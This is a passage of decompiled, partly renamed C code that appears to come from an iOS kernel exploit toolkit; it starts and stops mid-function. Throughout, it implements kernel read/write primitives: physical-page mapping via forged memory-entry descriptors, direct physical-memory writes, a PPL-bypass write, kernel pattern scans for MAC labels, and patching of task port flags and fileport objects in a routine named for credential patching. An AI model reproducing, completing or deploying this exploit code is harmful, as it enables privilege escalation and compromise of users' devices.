  v10 = check_krw_capabilities_version(krwCtx, (int *)&v18, (int *)&v17, (int *)&v16, (int *)&v15);
  if ( !(uint32_t)v10 )
  {
    v10 = get_proc_kobj_pair_cached(krwCtx, a3, &v19);
    if ( !(uint32_t)v10 )
    {
      v10 = 163857;
      v11 = v18;
      v12 = *(uint64_t *)(a2 + v18);
      if ( v12 && !validate_kaddr_range(krwCtx, v12) )
        return 163878;
      *(uint64_t *)(a2 + v11) = v19;
      if ( a4 )
      {
        if ( *(uint32_t *)(a2 + v17) > 3u )
          return v10;
        v13 = v16;
        if ( *(uint32_t *)(a2 + v16) > 0xB71B00u )
          return v10;
        *(uint32_t *)(a2 + v17) = 1;
        *(uint32_t *)(a2 + v13) = 12000000;
      }
      if ( *(unsigned __int16 *)(a2 + v15) <= 0x7Fu )
      {
        v10 = 0;
        *(uint16_t *)(a2 + v15) = a5;
      }
    }
  }
  return v10;
}

//----- (0000000000038158) ----------------------------------------------------
__int64 __fastcall map_physpage_with_ports(struct_krwCtx *krwCtx, __int64 a2, int a3, int a4, __int16 a5)
{
  __int64 v9; // x23
  vm_size_t v10; // x20
  kern_return_t v11; // w0
  __int64 v13; // x0
  vm_address_t v14; // x25
  __int64 v15; // x23
  __int64 v16; // x1
  __int64 v17; // x0
  __int64 v18; // x22
  __int64 v19; // x0
  __int64 v20; // x0
  __int64 v21; // x0
  int v22; // [xsp+0h] [xbp-70h] BYREF
  int v23; // [xsp+4h] [xbp-6Ch] BYREF
  unsigned int v24; // [xsp+8h] [xbp-68h] BYREF
  unsigned int v25; // [xsp+Ch] [xbp-64h] BYREF
  unsigned int v26; // [xsp+10h] [xbp-60h] BYREF
  unsigned int v27; // [xsp+14h] [xbp-5Ch] BYREF
  vm_address_t address; // [xsp+18h] [xbp-58h] BYREF
  __int64 v29; // [xsp+20h] [xbp-50h] BYREF
  __int16 v30; // [xsp+2Eh] [xbp-42h] BYREF

  v30 = a5;
  address = 0;
  v29 = 0;
  if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) == 0 )
    return 708616;
  v9 = check_krw_capabilities_version((int *)krwCtx, (int *)&v27, (int *)&v26, (int *)&v25, (int *)&v24);
  if ( !(uint32_t)v9 )
  {
    v9 = get_proc_kobj_pair_cached(krwCtx, a3, &v29);
    if ( !(uint32_t)v9 )
    {
      v10 = (unsigned int)krwCtx->pageSizeOrSomething;
      v11 = vm_allocate(mach_task_self_, &address, v10, 1);
      if ( v11 )
      {
        v9 = v11 | 0x80000000;
      }
      else
      {
        v13 = read_via_mapped_physmem_region(krwCtx, a2 & ~krwCtx->pageMask, (void *)address, v10, 1);
        v9 = v13;
        if ( !(uint32_t)v13 )
        {
          v14 = (krwCtx->pageMask & a2) + address;
          v15 = v27;
          v16 = *(uint64_t *)(v14 + v27);
          if ( v16 && !validate_kaddr_range(krwCtx, v16) )
          {
            v9 = 163878;
          }
          else
          {
            v17 = physwritebuf_direct_mapped(krwCtx, v15 + a2, &v29, krwCtx->stride_0x168, 1);
            v9 = v17;
            if ( !(uint32_t)v17 )
            {
              v9 = 163857;
              if ( !a4
                || (*(uint32_t *)(v14 + v26) <= 3u
                && (v18 = v25, *(uint32_t *)(v14 + v25) <= 0xB71B00u)
                && (v23 = 1, v19 = physwritebuf_direct_mapped(krwCtx, v26 + a2, &v23, 4u, 1), v9 = v19, !(uint32_t)v19)
                && (v22 = 12000000, v20 = physwritebuf_direct_mapped(krwCtx, v18 + a2, &v22, 4u, 1), v9 = v20, !(uint32_t)v20)) )
              {
                v9 = 163857;
                if ( *(unsigned __int16 *)(v14 + v24) <= 0x7Fu )
                {
                  v21 = physwritebuf_direct_mapped(krwCtx, v24 + a2, &v30, 2u, 1);
                  v9 = v21;
                }
              }
            }
          }
        }
      }
      if ( address && (uint32_t)v10 )
        vm_deallocate(mach_task_self_, address, v10);
    }
  }
  return v9;
}
// 38248: variable 'v13' is possibly undefined
// 38290: variable 'v17' is possibly undefined
// 382EC: variable 'v19' is possibly undefined
// 38310: variable 'v20' is possibly undefined
// 38348: variable 'v21' is possibly undefined

//----- (0000000000038378) ----------------------------------------------------
unsigned __int64 __fastcall translate_physmap_addr_via_segments(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v8; // x8
  uint64_t *i; // x9
  unsigned __int64 v10; // x10

  if ( krwCtx->xnuMajorVersion < 6153 )
    return a2 - a3 + a4;
  if ( !krwCtx->raw_0x1A08[2] && (unsigned int)init_or_get_kread_pattern_table(krwCtx) )
    return 0;
  v8 = krwCtx->iogpuObjCount;
  if ( !(uint32_t)v8 )
    return a2 - a3 + a4;
  for ( i = &krwCtx->raw_0x1A08[2]; ; i += 3 )
  {
    v10 = *(i - 2);
    if ( v10 <= a4 && *i + v10 > a4 )
      break;
    if ( !--v8 )
      return a2 - a3 + a4;
  }
  return a4 - v10 + *(i - 1);
}

//----- (0000000000038428) ----------------------------------------------------
__int64 __fastcall init_or_get_kread_pattern_table(struct_krwCtx *krwCtx)
{
  unsigned __int64 v2; // x20
  unsigned __int64 v3; // x0
  int v4; // w8
  bool v5; // zf
  __int64 v7; // x21
  unsigned __int64 v8; // x22
  __int64 v9; // x9
  __int64 v10; // x10
  uint64_t *v11; // x11
  __int64 v12; // [xsp+0h] [xbp-40h] BYREF
  __int64 record[3]; // [xsp+8h] [xbp-38h] BYREF

  v2 = krwCtx->iogpuKobjPtr2;
  if ( v2 )
  {
    if ( !krwCtx->iogpuObjCount )
      return 0;
  }
  else
  {
    LODWORD(v12) = 0;
    v3 = find_kernel_func_versioned(krwCtx->kernelMachoCtx, (int *)&v12);
    v4 = v12;
    if ( v3 )
      v5 = (uint32_t)v12 == 0;
    else
      v5 = 1;
    if ( v5 )
      return 708625;
    v2 = v3;
    krwCtx->iogpuKobjPtr2 = v3;
    krwCtx->iogpuObjCount = v4;
  }
  v7 = 0;
  v8 = 0;
  while ( 1 )
  {
    record[0] = 0;
    record[1] = 0;
    record[2] = 0;
    if ( !(unsigned int)krw_read_thunk(krwCtx, v2 + v7, 24, record) )
      break;
    v9 = record[1];
    v10 = record[2];
    if ( (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
      v10 = record[2] << 14;
    v11 = &krwCtx->raw_0x1A08[v7 / 8];
    v11[0] = record[0];
    v11[1] = v9;
    v11[2] = v10;
    ++v8;
    v7 += 24;
    if ( v8 >= krwCtx->iogpuObjCount )
      return 0;
  }
  return 163855;
}

//----- (0000000000038544) ----------------------------------------------------
unsigned __int64 __fastcall map_physpage_to_user(struct_krwCtx *krwCtx, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v8; // x8
  uint64_t *i; // x9
  unsigned __int64 v10; // x10

  if ( krwCtx->xnuMajorVersion < 6153 )
    return a3 - a2 + a4;
  if ( !krwCtx->raw_0x1A08[2] && (unsigned int)init_or_get_kread_pattern_table(krwCtx) )
    return 0;
  v8 = krwCtx->iogpuObjCount;
  if ( !(uint32_t)v8 )
    return a3 - a2 + a4;
  for ( i = &krwCtx->raw_0x1A08[2]; ; i += 3 )
  {
    v10 = *(i - 1);
    if ( v10 <= a4 && *i + v10 > a4 )
      break;
    if ( !--v8 )
      return a3 - a2 + a4;
  }
  return a4 - v10 + *(i - 2);
}

//----- (00000000000385F4) ----------------------------------------------------
__int64 __fastcall map_physpage_for_kobj(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  __int64 result; // x0
  __int64 v7; // x21
  unsigned __int64 translation_base; // [xsp+0h] [xbp-30h] BYREF
  unsigned __int64 translation_delta; // [xsp+8h] [xbp-28h] BYREF

  translation_base = krwCtx->gap_0x18A8;
  translation_delta = krwCtx->gap_0x18B0;
  if ( translation_base )
  {
    return map_physpage_to_user(krwCtx, translation_base, translation_delta, a2);
  }
  result = lookup_or_resolve_kaddr(krwCtx);
  if ( result )
  {
    result = walk_task_context_to_kobj(krwCtx, result);
    if ( result )
    {
      v7 = result;
      if ( !kread_physmap_decorated(krwCtx, result, &translation_base)
        || !kread_physmap_decorated(krwCtx, v7 + krwCtx->stride_0x168, &translation_delta) )
      {
        return 0;
      }
      krwCtx->gap_0x18A8 = translation_base;
      krwCtx->gap_0x18B0 = translation_delta;
      return map_physpage_to_user(krwCtx, translation_base, translation_delta, a2);
    }
  }
  return result;
}

//----- (00000000000386AC) ----------------------------------------------------
__int64 __fastcall resolve_physpage_addr(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  __int64 result; // x0
  __int64 v7; // x21
  unsigned __int64 translation_base; // [xsp+0h] [xbp-30h] BYREF
  unsigned __int64 translation_delta; // [xsp+8h] [xbp-28h] BYREF

  translation_base = krwCtx->gap_0x18A8;
  translation_delta = krwCtx->gap_0x18B0;
  if ( translation_base )
  {
    return translate_physmap_addr_via_segments(krwCtx, translation_base, translation_delta, a2);
  }
  result = lookup_or_resolve_kaddr(krwCtx);
  if ( result )
  {
    result = walk_task_context_to_kobj(krwCtx, result);
    if ( result )
    {
      v7 = result;
      if ( !kread_physmap_decorated(krwCtx, result, &translation_base)
        || !kread_physmap_decorated(krwCtx, v7 + krwCtx->stride_0x168, &translation_delta) )
      {
        return 0;
      }
      krwCtx->gap_0x18A8 = translation_base;
      krwCtx->gap_0x18B0 = translation_delta;
      return translate_physmap_addr_via_segments(krwCtx, translation_base, translation_delta, a2);
    }
  }
  return result;
}

//----- (0000000000038764) ----------------------------------------------------
__int64 __fastcall iterate_active_threads(struct_krwCtx *krwCtx)
{
  pthread_mutex_t *v2; // x20
  int v3; // w0
  int v4; // w8
  __int64 result; // x0
  unsigned __int64 i; // x8
  __int64 v7; // x20
  __int64 v8; // x1
  __int64 v9; // x2
  __int128 v10[8]; // [xsp+0h] [xbp-B0h] BYREF

  memset(v10, 0, sizeof(v10));
  v2 = &krwCtx->someMutex;
  v3 = pthread_mutex_lock(&krwCtx->someMutex);
  if ( v3 )
  {
    if ( v3 >= 0 )
      v4 = v3;
    else
      v4 = -v3;
    return v4 | 0x40000000u;
  }
  else
  {
    for ( i = 0; i != 128; i += 16LL )
    {
      if ( krwCtx->raw_0x2B0[i / 8] && (uint32_t)krwCtx->raw_0x2B0[i / 8 + 1] )
      {
        v10[i / 0x10] = ((__int128 *)krwCtx->raw_0x2B0)[i / 0x10];
        ((__int128 *)krwCtx->raw_0x2B0)[i / 0x10] = 0u;
      }
    }
    pthread_mutex_unlock(v2);
    v7 = 0;
    while ( 1 )
    {
      v8 = *(uint64_t *)&v10[v7];
      if ( v8 )
      {
        v9 = DWORD2(v10[v7]);
        if ( (uint32_t)v9 )
        {
#if RECOMP_ENABLE_STOCK_CLOSE_RESTORE
          result = map_shared_mem_and_transfer_data(krwCtx, v8, v9);
#else
          result = cleanup_restore_record_metadata_only(krwCtx, v8, v9);
#endif
          if ( (uint32_t)result )
            break;
        }
      }
      if ( ++v7 == 8 )
        return 0;
    }
  }
  return result;
}

//----- (0000000000038870) ----------------------------------------------------
uint32_t __fastcall physmap_map_cached(struct_krwCtx *krwCtx, unsigned __int64 paddr, __int64 a3)
{
  struct physmap_map_desc
  {
    uint64_t qword00;
    uint64_t qword08;
    uint64_t qword10;
    uint64_t qword18;
    uint32_t pmapObjectPage;
    uint32_t flags;
    uint32_t reserved28;
    uint32_t entrySize;
    uint32_t physicalPageNumber;
    uint32_t reserved34;
    uint32_t reserved38;
    uint32_t reserved3C;
  };
  vm_size_t pageSize; // x27
  int xnuMajorVersion; // w8
  __int64 v8; // x21
  kern_return_t memory_entry; // w0
  __int64 v12; // x22
  unsigned __int64 v13; // x0
  __int64 v14; // x0
  __int64 v15; // x24
  __int64 someInt1; // x8
  uint32_t *v18; // x9
  uint64_t *v19; // x9
  __int64 v20; // t1
  uint32_t *v21; // x11
  unsigned __int64 v22; // x0
  vm_address_t v23; // x1
  int v24; // [xsp+14h] [xbp-BCh] BYREF
  mem_entry_name_port_t object_handle[2]; // [xsp+18h] [xbp-B8h] BYREF
  vm_size_t size; // [xsp+20h] [xbp-B0h] BYREF
  vm_address_t address; // [xsp+28h] [xbp-A8h] BYREF
  struct physmap_map_desc desc; // [xsp+30h] [xbp-A0h] BYREF

  *(uint64_t *)(a3 + 48) = 0;
  *(__int128 *)(a3 + 16) = 0u;
  *(__int128 *)(a3 + 32) = 0u;
  *(__int128 *)a3 = 0u;
  address = 0;
  pageSize = vm_page_size;
  *(uint64_t *)object_handle = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  v8 = 0x2802C;
  if ( xnuMajorVersion > 8791 )
  {
    if ( xnuMajorVersion != 8792 && xnuMajorVersion != 10002 && xnuMajorVersion != 8796 )
      return v8;
  }
  else if ( (unsigned int)(xnuMajorVersion - 8019) >= 2 && xnuMajorVersion != 6153 && xnuMajorVersion != 7195 )
  {
    return v8;
  }
  memset(&desc, 0, sizeof(desc));
  size = vm_page_size;
  memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 0x20003, &object_handle[1], 0);
  if ( memory_entry )
  {
    v12 = 0;
LABEL_15:
    v8 = memory_entry | 0x80000000;
    goto LABEL_20;
  }
  v13 = get_task_kobject_addr(krwCtx, object_handle[1]);
  v8 = 0x28026;
  if ( !v13
    || (v14 = walk_kaddr_chain_to_target(krwCtx, v13, 0)) == 0
    || (v15 = v14, v8 = 0xAD009, object_handle[0] = 64, pthread_mutex_lock(&krwCtx->someMutex)) )
  {
    v12 = 0;
    goto LABEL_20;
  }
  someInt1 = krwCtx->someInt1;
  v18 = &krwCtx->someInt1 + 4 * someInt1;
  v20 = *((uint64_t *)v18 + 1);
  v19 = v18 + 2;
  v12 = v20;
  if ( v20 && (v21 = (uint32_t *)&krwCtx->raw_0x2B0[2 * someInt1 + 1], *v21) )
  {
    object_handle[0] = *v21;
    *v19 = 0;
    *v21 = 0;
    if ( (uint32_t)someInt1 )
      krwCtx->someInt1 = someInt1 - 1;
    pthread_mutex_unlock(&krwCtx->someMutex);
  }
  else
  {
    pthread_mutex_unlock(&krwCtx->someMutex);
    v12 = alloc_physmap_page(krwCtx, object_handle);
    if ( !v12 )
      goto LABEL_20;
  }
  v22 = kernel_va_base_resolver(krwCtx, 0, &v24);
  if ( v22 )
  {
    desc.pmapObjectPage = (uint32_t)((v15 - v22) >> v24);
    desc.flags = 0x2000000;
    desc.entrySize = 0x140;
    desc.physicalPageNumber = (uint32_t)(paddr / pageSize);
    if ( (unsigned int)kwrite_with_retry(krwCtx, v12, &desc, sizeof(desc)) )
    {
      memory_entry = vm_map(mach_task_self_, &address, size, 0, 1, object_handle[1], 0, 0, 3, 3, 1u);
      if ( memory_entry )
        goto LABEL_15;
      v23 = address;
      *(uint32_t *)address = 0;
      memory_entry = vm_protect(mach_task_self_, v23, size, 0, 0);
      if ( memory_entry )
        goto LABEL_15;
      memory_entry = vm_protect(mach_task_self_, address, size, 0, 3);
      if ( memory_entry )
        goto LABEL_15;
      if ( kwrite_physmap_with_a3_ptr(krwCtx, v15 + 32, v12) )
      {
        v8 = 0;
        *(uint32_t *)(a3 + 52) = object_handle[1];
        *(uint64_t *)a3 = address;
        *(uint64_t *)(a3 + 8) = pageSize;
        *(uint64_t *)(a3 + 16) = v12;
        *(uint32_t *)(a3 + 24) = object_handle[0];
        *(uint32_t *)(a3 + 28) = 1;
        return v8;
      }
    }
    v8 = 163856;
  }
  else
  {
    v8 = 708609;
  }
LABEL_20:
  if ( address && size )
    vm_deallocate(mach_task_self_, address, size);
  if ( object_handle[1] + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, object_handle[1]);
  if ( v12 && object_handle[0] )
    append_kaddr_to_physmem_table(krwCtx, v12, object_handle[0]);
  return v8;
}

//----- (0000000000038BCC) ----------------------------------------------------
__int64 __fastcall physmap_unmap_cached(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v4; // x8
  __int64 result; // x0
  kern_return_t kr; // w0

  result = 708609;
  v4 = *(uint64_t *)(a2 + 16);
  if ( v4 && *(uint64_t *)a2 )
  {
    if ( noppl_kwrite32(krwCtx, v4 + *(unsigned int *)(a2 + 48), -1) )
    {
      kr = vm_deallocate(mach_task_self_, *(uint64_t *)a2, *(uint64_t *)(a2 + 8) * *(unsigned int *)(a2 + 28));
      if ( kr )
      {
        result = kr | 0x80000000;
      }
      else
      {
        kr = mach_port_deallocate(mach_task_self_, *(uint32_t *)(a2 + 52));
        if ( kr )
          result = kr | 0x80000000;
        else
          result = append_kaddr_to_physmem_table(krwCtx, *(uint64_t *)(a2 + 16), *(unsigned int *)(a2 + 24));
      }
    }
    else
    {
      result = 163856;
    }
  }
  *(uint64_t *)(a2 + 48) = 0;
  *(__int128 *)(a2 + 16) = 0u;
  *(__int128 *)(a2 + 32) = 0u;
  *(__int128 *)a2 = 0u;
  return result;
}

//----- (0000000000038C8C) ----------------------------------------------------
__int64 __fastcall append_kaddr_to_physmem_table(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  pthread_mutex_t *v6; // x22
  int v7; // w0
  int v8; // w8
  __int64 v10; // x8
  __int64 *v11; // x9

  v6 = &krwCtx->someMutex;
  v7 = pthread_mutex_lock(&krwCtx->someMutex);
  if ( v7 )
  {
    if ( v7 >= 0 )
      v8 = v7;
    else
      v8 = -v7;
    return v8 | 0x40000000u;
  }
  v10 = krwCtx->someInt1;
  if ( (unsigned int)v10 <= 7 )
  {
    v11 = (__int64 *)&krwCtx->raw_0x2B0[2 * v10];
    while ( *v11 )
    {
      ++v10;
      v11 += 2;
      if ( v10 == 8 )
        goto LABEL_10;
    }
    krwCtx->someInt1 = v10;
    *v11 = a2;
    krwCtx->raw_0x2B0[2 * (unsigned int)v10 + 1] = (uint32_t)a3;
    pthread_mutex_unlock(v6);
    return 0;
  }
LABEL_10:
  pthread_mutex_unlock(v6);
  if ( !a2 )
    return 0;
  return map_shared_mem_and_transfer_data(krwCtx, a2, a3);
}
// 38D20: variable 'vars8' is possibly undefined

//----- (0000000000038D60) ----------------------------------------------------
__int64 __fastcall read_via_mapped_physmem_region(struct_krwCtx *krwCtx, unsigned __int64 a2, void *a3, unsigned int a4, int a5)
{
  __int64 (__fastcall *v9)(__int64, unsigned __int64, void *, unsigned int, int); // x5
  __int64 result; // x0
  uint64_t v10[7]; // [xsp+8h] [xbp-58h] BYREF

  v9 = (__int64 (__fastcall *)(__int64, unsigned __int64, void *, unsigned int, int))krwCtx->iogpuKread2Fn;
  if ( v9 )
  {
    return v9(krwCtx, a2, a3, a4, a5);
  }
  result = 708609;
  if ( !a5 )
    return result;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & 0x20) != 0 )
    return result + 7;
  result = physmap_map_cached(krwCtx, a2, (__int64)v10);
  if ( !(uint32_t)result )
  {
    memcpy(a3, (const void *)((krwCtx->pageMask & a2) + v10[0]), a4);
    return physmap_unmap_cached(krwCtx, (__int64)v10);
  }
  return result;
}

//----- (0000000000038E4C) ----------------------------------------------------
__int64 __fastcall physwritebuf_direct_mapped(
        struct_krwCtx *krwCtx,
        unsigned __int64 paddr,
        const void *buf,
        unsigned int size,
        int something)
{
  __int64 (__fastcall *v9)(struct_krwCtx *, unsigned __int64, const void *, unsigned int, int); // x5
  __int64 result; // x0
  uint64_t v10[7]; // [xsp+8h] [xbp-58h] BYREF

  v9 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, const void *, unsigned int, int))&krwCtx->iogpuKwrite2Fn;
  if ( v9 )
  {
    return v9(krwCtx, paddr, buf, size, something);
  }
  result = 708609;
  if ( !something )
    return result;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3)
    && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
  {
    return result + 7;
  }
  result = physmap_map_cached(krwCtx, paddr, (__int64)v10);
  if ( !(uint32_t)result )
  {
    memcpy((void *)((krwCtx->pageMask & paddr) + v10[0]), buf, size);
    return physmap_unmap_cached(krwCtx, (__int64)v10);
  }
  return result;
}

//----- (0000000000038F38) ----------------------------------------------------
__int64 __fastcall check_krw_read_thunk_ok(struct_krwCtx *krwCtx, __int64 a2, __int64 a3)
{
  if ( (unsigned int)krw_read_thunk(krwCtx, a2 + 8, 2, (void *)a3) )
    return 0;
  else
    return 163855;
}

//----- (0000000000038F6C) ----------------------------------------------------
__int64 __fastcall kwrite_u16_at_plus8(struct_krwCtx *krwCtx, __int64 a2, __int16 a3)
{
  __int16 v4; // [xsp+Eh] [xbp-2h] BYREF

  v4 = a3;
  if ( (unsigned int)kwrite_with_retry(krwCtx, a2 + 8, (__int64)&v4, 2) )
    return 0;
  else
    return 163856;
}

//----- (0000000000038FAC) ----------------------------------------------------
__int64 __fastcall u16_add10_clamped(unsigned int a1)
{
  unsigned __int16 v1; // w8

  v1 = a1 + 10;
  if ( a1 > 0xFFF4 )
    v1 = -2;
  if ( a1 > 0xFFFD )
    return (unsigned __int16)a1;
  return v1;
}

//----- (0000000000038FD4) ----------------------------------------------------
__int64 __fastcall kread_and_kwrite_u16_plus8_bumped(struct_krwCtx *krwCtx, __int64 a2)
{
  __int64 v4; // x19
  __int64 v5; // x21
  __int16 v6; // w8
  unsigned __int16 v8; // [xsp+Ch] [xbp-24h] BYREF
  __int16 v9; // [xsp+Eh] [xbp-22h] BYREF

  v4 = 163855;
  if ( !validate_kaddr_range(krwCtx, a2) )
    return 163878;
  v5 = a2 + 8;
  if ( (unsigned int)krw_read_thunk(krwCtx, v5, 2, &v8) )
  {
    if ( v8 <= 0xFFFDu )
    {
      if ( v8 <= 0xFFF4u )
        v6 = v8 + 10;
      else
        v6 = -2;
      v8 = v6;
      v9 = v6;
      if ( (unsigned int)kwrite_with_retry(krwCtx, v5, (__int64)&v9, 2) )
        return 0;
      else
        return 163856;
    }
    else
    {
      return 0;
    }
  }
  return v4;
}

//----- (0000000000039090) ----------------------------------------------------
uint64_t __fastcall remap_kaddr_through_physmap(struct_krwCtx *krwCtx, __int64 a2)
{
  uint64_t v4; // x8
  uint64_t v5; // x21
  unsigned __int64 v6; // x1
  bool v7; // zf
  uint64_t v8; // x8
  uint64_t result; // x0
  int v10; // w0
  __int64 v11; // x21
  __int64 v12; // x8
  bool v13; // zf
  __int64 v14; // x8
  uint64_t v16; // x9
  uint8_t v17[32]; // [xsp+8h] [xbp-48h] BYREF
  __int64 v18; // [xsp+28h] [xbp-28h]

  v4 = krwCtx->gap_0x18B8;
  v5 = krwCtx->pageMask;
  v6 = a2 & ~v5;
  if ( v4 )
    v7 = v4 == v6;
  else
    v7 = 0;
  if ( v7 )
  {
    v8 = krwCtx->gap_0x18C0;
    if ( v8 )
      return v8 + (v5 & a2);
  }
  pgtable_walk_wrapper(krwCtx, v6, (__int64)v17);
  if ( !v10 )
    return 0;
  v11 = v5 & a2;
  v12 = resolve_physpage_addr(krwCtx, v18 & 0xFFFFFFFFC000LL);
  result = 0;
  v13 = v12 == 0;
  if ( v12 )
    v14 = v12 + v11;
  else
    v14 = 0;
  if ( !v13 && v14 != 0 )
  {
    v16 = krwCtx->pageMask;
    krwCtx->gap_0x18B8 = a2 & ~v16;
    krwCtx->gap_0x18C0 = v14 & ~v16;
    return v14;
  }
  return result;
}
// 390E8: variable 'v10' is possibly undefined

//----- (0000000000039150) ----------------------------------------------------
__int64 __fastcall task_thread_port_cred_patch(__int64 x0_0)
{
  __int64 v2; // x20
  __int64 v3; // x27
  task_inspect_t v4; // w22
  __int128 v5; // q0
  unsigned __int64 v6; // x0
  uint64_t *v7; // x21
  __int64 v8; // x23
  int v9; // w0
  int v10; // w8
  int v12; // w28
  mach_vm_address_t v13; // x0
  mach_vm_address_t v14; // x21
  __int16 v15; // w26
  thread_act_t v16; // w0
  mach_port_t v17; // w0
  int v18; // w23
  unsigned __int64 v19; // x0
  unsigned __int64 v20; // x23
  __int64 v21; // x8
  char v22; // w9
  char v23; // w21
  int v24; // w0
  __int64 k; // x20
  int v26; // w0
  unsigned __int64 v27; // x23
  unsigned __int64 i; // x23
  mach_port_t v29; // w8
  thread_act_t v30; // w0
  thread_act_array_t v31; // x8
  __int64 v32; // x22
  mach_port_t v33; // w8
  thread_act_t v34; // w0
  __int64 v35; // x23
  int v36; // w23
  int v37; // w8
  unsigned __int64 j; // x22
  mach_port_t v39; // w8
  thread_act_t v40; // w0
  __int64 v41; // x8
  __int64 v42; // x24
  bool v43; // zf
  __int64 v44; // x28
  __int64 v45; // x22
  __int64 v47; // x8
  __int64 v48; // x24
  __int64 v49; // x27
  unsigned __int64 v50; // x0
  unsigned __int64 v51; // x22
  kern_return_t v52; // w0
  int v53; // w22
  int v54; // w8
  __int64 v55; // [xsp+10h] [xbp-110h] BYREF
  __int64 v56; // [xsp+18h] [xbp-108h] BYREF
  task_suspension_token_t suspend_token[2]; // [xsp+20h] [xbp-100h] BYREF
  int a1[3]; // [xsp+28h] [xbp-F8h] BYREF
  mach_msg_type_number_t act_listCnt; // [xsp+34h] [xbp-ECh] BYREF
  thread_act_array_t act_list; // [xsp+38h] [xbp-E8h] BYREF
  mach_port_name_t name; // [xsp+44h] [xbp-DCh] BYREF
  __int64 v62; // [xsp+48h] [xbp-D8h] BYREF
  __int128 v63[3]; // [xsp+50h] [xbp-D0h] BYREF
  uint64_t v64[7]; // [xsp+88h] [xbp-98h] BYREF

  v2 = *(uint64_t *)x0_0;
  v3 = *(unsigned int *)(x0_0 + 8);
  v62 = 0;
  name = 0;
  act_list = 0;
  act_listCnt = 0;
  v4 = *(uint32_t *)(v2 + 6392);
  *(uint64_t *)suspend_token = 0;
  *(uint64_t *)a1 = -1;
  *(uint64_t *)&v5 = -1;
  *((uint64_t *)&v5 + 1) = -1;
  v63[0] = v5;
  v63[1] = v5;
  v63[2] = v5;
  v6 = kernel_cstring_pattern_scan(v2, "MAC Labels");
  if ( !v6 || (unsigned int)find_kfunc_ptr_in_kernel_data((struct_krwCtx *)v2, v6) )
  {
LABEL_6:
    v10 = 0;
    goto LABEL_7;
  }
  v7 = v64;
  v8 = -3;
  while ( v8 )
  {
    v9 = kread64_internal(
           (struct_krwCtx *)v2,
           *(uint64_t *)(v2 + 6384) + (unsigned int)(*(uint32_t *)(v2 + 360) * (v8 + 4)),
           v7++);
    ++v8;
    if ( !v9 )
      goto LABEL_6;
  }
  v12 = 163878;
  v13 = get_task_port_kaddr_wrap(v2, mach_task_self_, suspend_token);
  if ( v13 )
  {
    v14 = v13;
    v15 = suspend_token[0];
    if ( (suspend_token[0] & 0x400) != 0 || noppl_kwrite32(v2, v13, suspend_token[0] | 0x400) )
    {
      v16 = mach_thread_self();
      if ( set_thread_abs_realtime_50(v16) )
      {
        v17 = mach_thread_self();
        v18 = kwrite_task_kobj_field_via_physmap((struct_krwCtx *)v2, v17, 1, 1, 96);
        if ( v18 )
          goto LABEL_20;
        thread_switch(0, 2, 0xAu);
        if ( pipe(a1) || (unsigned int)j__fileport_makeport(a1[1], &name) )
        {
          __error();
          __error();
          v18 = 163878;
          if ( (v15 & 0x400) != 0 )
            goto LABEL_22;
LABEL_21:
          noppl_kwrite32(v2, v14, suspend_token[0]);
          v12 = v18;
          goto LABEL_22;
        }
        v19 = get_task_kobject_addr((struct_krwCtx *)v2, name);
        if ( v19 )
        {
          v20 = v19;
          if ( !mach_port_deallocate(mach_task_self_, name) )
          {
            name = 0;
            v27 = v20 + 88;
            if ( kread64_internal((struct_krwCtx *)v2, v27, &v62)
              && validate_kaddr_range(v2, v62)
              && kwrite64(v2, v27, *(uint64_t *)(v2 + 6384)) )
            {
              if ( v4 == mach_task_self_ )
              {
                if ( !task_threads(v4, &act_list, &act_listCnt) )
                {
                  if ( act_listCnt )
                  {
                    for ( i = 0; i < act_listCnt; ++i )
                    {
                      if ( act_list[i] + 1 >= 2 )
                      {
                        v29 = mach_thread_self();
                        v30 = act_list[i];
                        if ( v29 != v30 )
                          thread_suspend(v30);
                      }
                    }
                  }
                  goto LABEL_46;
                }
              }
              else if ( !task_suspend2(v4, &suspend_token[1]) )
              {
LABEL_46:
                if ( close(a1[0]) || (a1[0] = -1, close(a1[1])) )
                {
                  __error();
                  __error();
LABEL_49:
                  if ( v4 == mach_task_self_ )
                  {
                    v31 = act_list;
                    if ( act_list && act_listCnt )
                    {
                      v32 = 0;
                      while ( 1 )
                      {
                        if ( v31[v32] + 1 >= 2 )
                        {
                          v33 = mach_thread_self();
                          v34 = act_list[v32];
                          if ( v33 != v34 )
                            thread_resume(v34);
                        }
                        if ( ++v32 >= (unsigned __int64)act_listCnt )
                          break;
                        v31 = act_list;
                      }
                      vm_deallocate(mach_task_self_, (vm_address_t)act_list, 4LL * act_listCnt);
                    }
                  }
                  else if ( suspend_token[1] + 1 >= 2 )
                  {
                    task_resume2(suspend_token[1]);
                    suspend_token[1] = 0;
                  }
                  v18 = 163878;
LABEL_62:
                  v12 = 163878;
                  if ( (v15 & 0x400) != 0 )
                    goto LABEL_22;
                  goto LABEL_21;
                }
                v35 = 0;
                a1[1] = -1;
                while ( !pipe((int *)((char *)v63 + v35)) )
                {
                  v35 += 8;
                  if ( v35 == 48 )
                  {
                    v18 = 0;
                    goto LABEL_71;
                  }
                }
                v36 = errno;
                v37 = errno;
                if ( v36 < 0 )
                  v37 = -v37;
                v18 = v37 | 0x40000000;
LABEL_71:
                if ( v4 == mach_task_self_ )
                {
                  if ( act_listCnt )
                  {
                    for ( j = 0; j < act_listCnt; ++j )
                    {
                      if ( act_list[j] + 1 >= 2 )
                      {
                        v39 = mach_thread_self();
                        v40 = act_list[j];
                        if ( v39 != v40 )
                          thread_resume(v40);
                      }
                    }
                  }
                }
                else
                {
                  if ( task_resume2(suspend_token[1]) )
